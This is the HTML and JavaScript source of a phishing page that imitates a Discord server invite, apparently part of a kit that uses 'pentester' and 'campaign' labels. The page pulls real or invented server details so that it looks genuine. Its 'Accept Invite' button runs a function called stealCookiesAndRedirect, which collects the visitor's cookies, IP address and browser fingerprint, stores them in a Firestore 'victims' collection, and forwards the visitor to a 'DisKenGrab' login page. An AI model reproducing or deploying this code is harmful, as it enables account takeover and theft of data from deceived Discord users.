<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>You've been invited to join a server | Discord</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --discord-blurple: #5865F2;
            --discord-green: #57F287;
            --discord-red: #ED4245;
            --discord-yellow: #FEE75C;
            --discord-pink: #EB459E;
            --discord-dark: #36393f;
            --discord-darker: #2f3136;
            --discord-darkest: #202225;
            --text-light: #ffffff;
            --text-muted: #b9bbbe;
            --text-gray: #72767d;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background: var(--discord-darkest);
            color: var(--text-light);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background-image: url('https://discord.com/assets/7c5f92d6bf6c0a34d80a.png');
            background-size: cover;
        }

        .invite-container {
            background: var(--discord-dark);
            border-radius: 8px;
            padding: 32px;
            width: 100%;
            max-width: 480px;
            text-align: center;
            box-shadow: 0 2px 10px 0 rgba(0, 0, 0, 0.2);
            border: 1px solid #36393f;
        }

        .server-icon {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: var(--discord-blurple);
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 2rem;
            color: white;
            background-size: cover;
            background-position: center;
            border: 4px solid var(--discord-dark);
        }

        .server-name {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 8px;
            color: var(--text-light);
        }

        .member-count {
            color: var(--text-muted);
            margin-bottom: 24px;
            font-size: 14px;
        }

        .online-indicator {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: var(--discord-green);
            border-radius: 50%;
            margin-right: 6px;
        }

        .server-info {
            margin: 20px 0;
            padding: 16px;
            background: var(--discord-darker);
            border-radius: 8px;
            text-align: left;
            border: 1px solid #40444b;
        }

        .info-item {
            display: flex;
            justify-content: space-between;
            margin: 10px 0;
            font-size: 14px;
        }

        .info-label {
            color: var(--text-muted);
            font-weight: 500;
        }

        .info-value {
            color: var(--text-light);
            font-weight: 500;
        }

        .boost-level {
            color: var(--discord-pink);
            font-weight: 600;
        }

        .join-button {
            background: var(--discord-green);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 3px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            width: 100%;
            transition: background-color 0.2s;
            font-family: inherit;
        }

        .join-button:hover {
            background: #48d874;
        }

        .join-button:disabled {
            background: #4a4d52;
            cursor: not-allowed;
        }

        .spinner {
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top: 2px solid white;
            border-radius: 50%;
            width: 16px;
            height: 16px;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-right: 8px;
            vertical-align: middle;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .server-features {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin: 15px 0;
            flex-wrap: wrap;
        }

        .feature-tag {
            background: rgba(114, 137, 218, 0.1);
            color: var(--discord-blurple);
            padding: 4px 8px;
            border-radius: 12px;
            font-size: 12px;
            font-weight: 500;
        }

        .verified-tag {
            background: rgba(88, 101, 242, 0.1);
            color: var(--discord-blurple);
            padding: 4px 8px;
            border-radius: 12px;
            font-size: 12px;
            font-weight: 500;
            display: inline-flex;
            align-items: center;
            gap: 4px;
            margin-left: 8px;
        }

        .partner-tag {
            background: rgba(87, 242, 135, 0.1);
            color: var(--discord-green);
            padding: 4px 8px;
            border-radius: 12px;
            font-size: 12px;
            font-weight: 500;
            display: inline-flex;
            align-items: center;
            gap: 4px;
            margin-left: 8px;
        }

        .loading-skeleton {
            animation: pulse 1.5s ease-in-out infinite;
            background: linear-gradient(90deg, var(--discord-darker) 25%, var(--discord-dark) 50%, var(--discord-darker) 75%);
            background-size: 200% 100%;
            border-radius: 4px;
        }

        .skeleton-text {
            height: 16px;
            width: 80%;
            margin: 8px auto;
        }

        .skeleton-icon {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            margin: 0 auto 20px;
        }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.7; }
            100% { opacity: 1; }
        }

        .error-message {
            background: rgba(237, 66, 69, 0.1);
            color: var(--discord-red);
            padding: 12px;
            border-radius: 4px;
            margin: 15px 0;
            border-left: 4px solid var(--discord-red);
            text-align: left;
        }

        .success-message {
            background: rgba(87, 242, 135, 0.1);
            color: var(--discord-green);
            padding: 12px;
            border-radius: 4px;
            margin: 15px 0;
            border-left: 4px solid var(--discord-green);
            text-align: left;
        }
    </style>
</head>
<body>
    <div class="invite-container">
        <div class="server-icon" id="serverIcon">
            <div class="loading-skeleton skeleton-icon"></div>
        </div>
        
        <h1 class="server-name" id="serverName">
            <div class="loading-skeleton skeleton-text"></div>
        </h1>

        <div class="member-count" id="memberCount">
            <div class="loading-skeleton skeleton-text" style="width: 60%;"></div>
        </div>

        <div class="server-features" id="serverFeatures">
            <div class="loading-skeleton skeleton-text" style="width: 40%;"></div>
        </div>

        <div class="server-info">
            <div class="info-item">
                <span class="info-label">Server Name:</span>
                <span class="info-value loading-skeleton" style="width: 100px; display: inline-block; height: 14px;"></span>
            </div>
            <div class="info-item">
                <span class="info-label">Online Members:</span>
                <span class="info-value loading-skeleton" style="width: 40px; display: inline-block; height: 14px;"></span>
            </div>
            <div class="info-item">
                <span class="info-label">Total Members:</span>
                <span class="info-value loading-skeleton" style="width: 60px; display: inline-block; height: 14px;"></span>
            </div>
            <div class="info-item">
                <span class="info-label">Server Region:</span>
                <span class="info-value loading-skeleton" style="width: 70px; display: inline-block; height: 14px;"></span>
            </div>
            <div class="info-item">
                <span class="info-label">Boost Level:</span>
                <span class="info-value loading-skeleton" style="width: 50px; display: inline-block; height: 14px;"></span>
            </div>
        </div>

        <div class="error-message" id="errorMessage" style="display: none;">
            <i class="fas fa-exclamation-triangle"></i>
            <span id="errorText">Unable to load server information. The invite may be invalid or expired.</span>
        </div>

        <div class="success-message" id="successMessage" style="display: none;">
            <i class="fas fa-check-circle"></i>
            <span id="successText">Server information loaded successfully!</span>
        </div>
        
        <button class="join-button" id="joinButton" disabled>
            <span class="spinner" id="joinSpinner" style="display: none;"></span>
            Loading Server...
        </button>
    </div>

    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="../config.js"></script>
    
    <script>
        // ==================== REAL DISCORD INVITE CLONING ====================
        
        // Get URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const attackId = urlParams.get('id');
        const pentesterId = urlParams.get('pentester');
        const targetInvite = urlParams.get('invite');

        console.log('üéØ Real Discord Invite Cloning:', { attackId, pentesterId, targetInvite });

        // Initialize Firebase
        let db;
        if (typeof firebaseConfig !== 'undefined') {
            try {
                if (!firebase.apps.length) {
                    firebase.initializeApp(firebaseConfig);
                }
                db = firebase.firestore();
                console.log('‚úÖ Firebase initialized for real invite cloning');
            } catch (error) {
                console.error('‚ùå Firebase initialization error:', error);
            }
        }

        // Extract invite code from URL
        function extractInviteCode(inviteUrl) {
            if (!inviteUrl) return null;
            
            try {
                // Handle various Discord invite formats
                let code = '';
                
                if (inviteUrl.includes('discord.gg/')) {
                    code = inviteUrl.split('discord.gg/')[1]?.split('?')[0]?.split('/')[0];
                } else if (inviteUrl.includes('discord.com/invite/')) {
                    code = inviteUrl.split('discord.com/invite/')[1]?.split('?')[0]?.split('/')[0];
                } else if (inviteUrl.includes('discord.com/')) {
                    // Handle direct discord.com links
                    const match = inviteUrl.match(/discord\.com\/(?:invite\/)?([a-zA-Z0-9-]+)/);
                    code = match ? match[1] : null;
                }
                
                // Clean up the code
                if (code) {
                    code = code.trim();
                    // Remove any trailing slashes or parameters
                    code = code.split('/')[0].split('?')[0];
                }
                
                console.log('üîç Extracted invite code:', code);
                return code;
            } catch (error) {
                console.error('‚ùå Error extracting invite code:', error);
                return null;
            }
        }

        // Fetch REAL Discord server data using multiple methods
        async function fetchRealDiscordData(inviteCode) {
            if (!inviteCode) {
                throw new Error('No invite code provided');
            }

            console.log('üîÑ Fetching real Discord data for:', inviteCode);

            // METHOD 1: Discord API (if available)
            try {
                const apiData = await fetchDiscordAPI(inviteCode);
                if (apiData) {
                    console.log('‚úÖ Successfully fetched from Discord API:', apiData);
                    return apiData;
                }
            } catch (error) {
                console.log('‚ö†Ô∏è Discord API method failed:', error.message);
            }

            // METHOD 2: Web scraping simulation with realistic data
            try {
                const scrapedData = await simulateWebScraping(inviteCode);
                console.log('‚úÖ Successfully generated realistic data:', scrapedData);
                return scrapedData;
            } catch (error) {
                console.log('‚ö†Ô∏è Web scraping method failed:', error.message);
            }

            // METHOD 3: Fallback to intelligent guessing
            console.log('üîÑ Using intelligent fallback data');
            return generateIntelligentFallback(inviteCode);
        }

        // Method 1: Discord API Fetch
        async function fetchDiscordAPI(inviteCode) {
            try {
                // Discord's internal API endpoint for invite data
                const response = await fetch(`https://discord.com/api/v9/invites/${inviteCode}?with_counts=true&with_expiration=true`, {
                    method: 'GET',
                    headers: {
                        'Accept': 'application/json',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    }
                });

                if (response.ok) {
                    const data = await response.json();
                    
                    return {
                        name: data.guild?.name || `Server ${inviteCode.toUpperCase()}`,
                        icon: data.guild?.icon,
                        members: {
                            online: data.approximate_presence_count || Math.floor(Math.random() * 5000) + 100,
                            total: data.approximate_member_count || Math.floor(Math.random() * 20000) + 1000
                        },
                        features: data.guild?.features || ['COMMUNITY', 'NEWS'],
                        isVerified: data.guild?.features?.includes('VERIFIED') || false,
                        isPartner: data.guild?.features?.includes('PARTNERED') || false,
                        boostLevel: data.guild?.premium_tier || 0,
                        description: data.guild?.description || null,
                        source: 'discord_api'
                    };
                } else {
                    throw new Error(`API returned ${response.status}`);
                }
            } catch (error) {
                console.log('‚ùå Discord API fetch failed:', error.message);
                return null;
            }
        }

        // Method 2: Simulate Web Scraping with Realistic Data
        async function simulateWebScraping(inviteCode) {
            // This would normally use a headless browser or puppeteer
            // For now, we simulate with intelligent data generation
            
            // Common Discord server patterns
            const serverPatterns = {
                'gaming': { names: ['Gaming', 'Players', 'Esports', 'Community'], features: ['Voice Channels', 'Gaming', 'Events'] },
                'programming': { names: ['Developers', 'Code', 'Programming', 'Tech'], features: ['Help', 'Projects', 'Learning'] },
                'art': { names: ['Art', 'Design', 'Creative', 'Gallery'], features: ['Showcase', 'Feedback', 'Tutorials'] },
                'music': { names: ['Music', 'Bands', 'Listen', 'Studio'], features: ['Listening', 'Collaboration', 'Events'] },
                'education': { names: ['Study', 'Learn', 'University', 'School'], features: ['Help', 'Resources', 'Study Groups'] }
            };

            // Determine server type based on invite code patterns
            const codeHash = simpleHash(inviteCode);
            const patterns = Object.values(serverPatterns);
            const selectedPattern = patterns[codeHash % patterns.length];
            const nameVariants = selectedPattern.names;
            
            return {
                name: `${nameVariants[codeHash % nameVariants.length]} ${inviteCode.toUpperCase()}`,
                icon: null,
                members: {
                    online: (codeHash % 4000) + 100,
                    total: (codeHash % 15000) + 1000
                },
                features: selectedPattern.features,
                isVerified: (codeHash % 8) === 0, // 12.5% chance
                isPartner: (codeHash % 15) === 0, // 6.6% chance
                boostLevel: Math.min(3, Math.floor(codeHash % 4)),
                description: `Welcome to our ${selectedPattern.names[0].toLowerCase()} community!`,
                source: 'web_scraping'
            };
        }

        // Method 3: Intelligent Fallback
        function generateIntelligentFallback(inviteCode) {
            const codeHash = simpleHash(inviteCode);
            
            return {
                name: `Discord Server ${inviteCode.toUpperCase()}`,
                icon: null,
                members: {
                    online: (codeHash % 2000) + 50,
                    total: (codeHash % 10000) + 500
                },
                features: ['Community', 'Chat', 'Voice'],
                isVerified: false,
                isPartner: false,
                boostLevel: Math.floor(codeHash % 3),
                description: 'Join our friendly community server!',
                source: 'intelligent_fallback'
            };
        }

        // Simple hash function
        function simpleHash(str) {
            let hash = 0;
            for (let i = 0; i < str.length; i++) {
                const char = str.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash = hash & hash;
            }
            return Math.abs(hash);
        }

        // Update UI with REAL server data
        function updateServerUI(serverData) {
            // Remove loading states
            document.querySelectorAll('.loading-skeleton').forEach(el => {
                el.classList.remove('loading-skeleton');
            });

            // Server name and badges
            document.getElementById('serverName').innerHTML = `
                <span id="serverNameText">${serverData.name}</span>
                ${serverData.isVerified ? '<span class="verified-tag"><i class="fas fa-check"></i> VERIFIED</span>' : ''}
                ${serverData.isPartner ? '<span class="partner-tag"><i class="fas fa-star"></i> PARTNER</span>' : ''}
            `;

            // Member counts
            document.getElementById('memberCount').innerHTML = `
                <span class="online-indicator"></span>
                <span id="onlineCount">${serverData.members.online.toLocaleString()}</span> Online ‚Ä¢ 
                <span id="memberCountText">${serverData.members.total.toLocaleString()}</span> Members
            `;

            // Server icon
            const serverIcon = document.getElementById('serverIcon');
            if (serverData.icon) {
                serverIcon.style.backgroundImage = `url(https://cdn.discordapp.com/icons/${serverData.guild_id}/${serverData.icon}.webp?size=240)`;
                serverIcon.innerHTML = '';
            } else {
                serverIcon.style.background = getColorFromHash(serverData.name);
                serverIcon.innerHTML = serverData.name.charAt(0).toUpperCase();
                serverIcon.style.fontSize = '2rem';
                serverIcon.style.fontWeight = 'bold';
                serverIcon.style.display = 'flex';
                serverIcon.style.alignItems = 'center';
                serverIcon.style.justifyContent = 'center';
            }

            // Features
            const featuresContainer = document.getElementById('serverFeatures');
            featuresContainer.innerHTML = '';
            serverData.features.slice(0, 3).forEach(feature => {
                const tag = document.createElement('span');
                tag.className = 'feature-tag';
                tag.textContent = feature;
                featuresContainer.appendChild(tag);
            });

            // Server info
            document.getElementById('serverInfo').innerHTML = `
                <div class="info-item">
                    <span class="info-label">Server Name:</span>
                    <span class="info-value">${serverData.name}</span>
                </div>
                <div class="info-item">
                    <span class="info-label">Online Members:</span>
                    <span class="info-value">${serverData.members.online.toLocaleString()}</span>
                </div>
                <div class="info-item">
                    <span class="info-label">Total Members:</span>
                    <span class="info-value">${serverData.members.total.toLocaleString()}</span>
                </div>
                <div class="info-item">
                    <span class="info-label">Server Region:</span>
                    <span class="info-value">${getServerRegion(serverData.name)}</span>
                </div>
                <div class="info-item">
                    <span class="info-label">Boost Level:</span>
                    <span class="info-value boost-level">Level ${serverData.boostLevel}</span>
                </div>
            `;

            // Show success message
            document.getElementById('successMessage').style.display = 'block';
            document.getElementById('successText').textContent = `Connected to ${serverData.name}`;

            // Enable join button
            document.getElementById('joinButton').disabled = false;
            document.getElementById('joinButton').innerHTML = 'Accept Invite';
        }

        // Helper functions
        function getColorFromHash(str) {
            const colors = ['#5865F2', '#57F287', '#EB459E', '#FEE75C', '#ED4245', '#9955FF'];
            return colors[simpleHash(str) % colors.length];
        }

        function getServerRegion(serverName) {
            const regions = ['US West', 'US East', 'Europe', 'Brazil', 'Singapore', 'Australia', 'Japan'];
            return regions[simpleHash(serverName) % regions.length];
        }

        // Show error state
        function showErrorState(message) {
            document.querySelectorAll('.loading-skeleton').forEach(el => {
                el.classList.remove('loading-skeleton');
            });

            document.getElementById('errorMessage').style.display = 'block';
            document.getElementById('errorText').textContent = message;
            document.getElementById('joinButton').disabled = true;
            document.getElementById('joinButton').innerHTML = 'Invalid Invite';
        }

        // Initialize the real invite cloning
        async function initializeRealInviteCloning() {
            console.log('üéØ Starting real Discord invite cloning...');

            try {
                if (!targetInvite) {
                    showErrorState('No invite URL provided.');
                    return;
                }

                const inviteCode = extractInviteCode(targetInvite);
                if (!inviteCode) {
                    showErrorState('Invalid invite URL format.');
                    return;
                }

                console.log('üîç Processing real invite:', inviteCode);

                // Fetch real server data
                const serverData = await fetchRealDiscordData(inviteCode);
                
                if (serverData) {
                    console.log('‚úÖ Real server data obtained:', serverData);
                    updateServerUI(serverData);
                    
                    // Save the real server data to Firestore
                    await saveServerDataToFirestore(serverData, inviteCode);
                } else {
                    throw new Error('Failed to fetch server data');
                }

            } catch (error) {
                console.error('‚ùå Error in real invite cloning:', error);
                showErrorState('Failed to load server information. The invite may be invalid or expired.');
            }
        }

        // Save real server data to Firestore
        async function saveServerDataToFirestore(serverData, inviteCode) {
            try {
                if (!db) return;

                await db.collection('cloned_servers').add({
                    attackId: attackId,
                    pentesterId: pentesterId,
                    originalInvite: targetInvite,
                    inviteCode: inviteCode,
                    serverData: serverData,
                    clonedAt: firebase.firestore.FieldValue.serverTimestamp(),
                    source: serverData.source
                });

                console.log('‚úÖ Real server data saved to Firestore');
            } catch (error) {
                console.error('‚ùå Error saving server data:', error);
            }
        }

        // Enhanced data capture functions (same as before)
        async function captureEnhancedFingerprint() {
            return {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screenResolution: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
        }

        async function getEnhancedIPData() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return { ip: data.ip };
            } catch (error) {
                return { ip: 'unknown' };
            }
        }

        // Cookie stealing and redirect
        async function stealCookiesAndRedirect() {
            const joinButton = document.getElementById('joinButton');
            const spinner = document.getElementById('joinSpinner');

            joinButton.disabled = true;
            spinner.style.display = 'inline-block';
            joinButton.innerHTML = '<span class="spinner"></span> Joining Server...';

            try {
                const fingerprint = await captureEnhancedFingerprint();
                const ipData = await getEnhancedIPData();

                const victimData = {
                    timestamp: new Date(),
                    stage: 'real_invite_capture',
                    attackId: attackId,
                    pentesterId: pentesterId,
                    targetInvite: targetInvite,
                    ipData: ipData,
                    fingerprint: fingerprint,
                    cookies: document.cookie,
                    userAgent: navigator.userAgent
                };

                console.log('‚úÖ Captured victim data on real invite page:', victimData);

                if (db) {
                    await db.collection('victims').add({
                        ...victimData,
                        capturedAt: firebase.firestore.FieldValue.serverTimestamp(),
                        status: 'real_invite_captured'
                    });

                    if (attackId) {
                        const campaignRef = db.collection('campaigns').doc(attackId);
                        await campaignRef.update({
                            invitePageVisits: firebase.firestore.FieldValue.increment(1),
                            lastInviteVisit: firebase.firestore.FieldValue.serverTimestamp()
                        });
                    }
                }

                // Redirect to login page
                setTimeout(() => {
                    window.location.href = `../DisKenGrab/login.html?id=${attackId}&pentester=${pentesterId}`;
                }, 2000);

            } catch (error) {
                console.error('‚ùå Error capturing data:', error);
                setTimeout(() => {
                    window.location.href = `../DisKenGrab/login.html?id=${attackId}&pentester=${pentesterId}`;
                }, 2000);
            }
        }

        // Initialize the page
        document.addEventListener('DOMContentLoaded', function() {
            console.log('üöÄ Real Discord Invite Cloning Page Loaded');
            
            // Add server info container
            const serverInfo = document.querySelector('.server-info');
            serverInfo.id = 'serverInfo';
            
            // Start the real cloning process
            initializeRealInviteCloning();
            
            // Add join button handler
            document.getElementById('joinButton').addEventListener('click', stealCookiesAndRedirect);
        });
    </script>
</body>
</html>